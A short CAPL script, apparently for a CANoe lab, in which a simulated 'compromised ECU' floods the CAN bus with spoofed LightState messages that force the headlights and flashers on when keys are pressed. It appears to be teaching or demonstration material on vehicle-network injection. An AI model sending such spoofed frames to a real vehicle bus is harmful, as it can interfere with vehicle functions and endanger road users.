/*@!Encoding:1252*/

variables
{
  message LightState msg_LightState; // declaration of message into a variable
  mstimer t;
  int tdelay=1;
}

on start
{
   write("Hello World, I am a compromised ECU.");
}

on key 'h'
{
  write("Sending manipulated CAN messages.");
  settimer(t,tdelay);
}

on key 'c'
{
  write("Stopped manipulated CAN messages.");
  cancelTimer(t);
}

on key 'r'
{ 
  msg_LightState.HeadLight = 1; // assign the value to the message
  msg_LightState.FlashLight = 1; // assign the value to the message
  output(msg_LightState); //send the message to the CAN bus
}

on timer t{
  msg_LightState.HeadLight = 1; // assign the value to the message
  msg_LightState.FlashLight = 1; // assign the value to the message
  output(msg_LightState); //send the message to the CAN bus
  settimer(t,tdelay);
}